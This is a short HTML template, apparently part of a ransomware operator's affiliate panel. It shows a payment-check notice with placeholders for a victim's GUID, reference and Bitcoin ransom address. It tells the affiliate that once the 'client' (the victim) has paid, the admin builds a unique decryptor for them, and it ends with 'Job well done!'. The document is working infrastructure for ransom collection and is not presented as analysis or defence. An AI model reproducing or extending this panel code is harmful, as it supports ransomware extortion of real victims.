<center><h3>New Payment Check From Client</h3></center>

<center>
<p><strong>GUID: </strong>{{$randd}}</p><br>
<p><strong>Ref: </strong>{{$r}}</p><br>
<p><strong>Bitcoin address: </strong>{{$btc}}</p><br>
</center><br>

<p style="font-color: red;"><em><strong>If the client has paid, contact admin to build unique decryptor and send to your client. Job well done!</strong></em></p><br>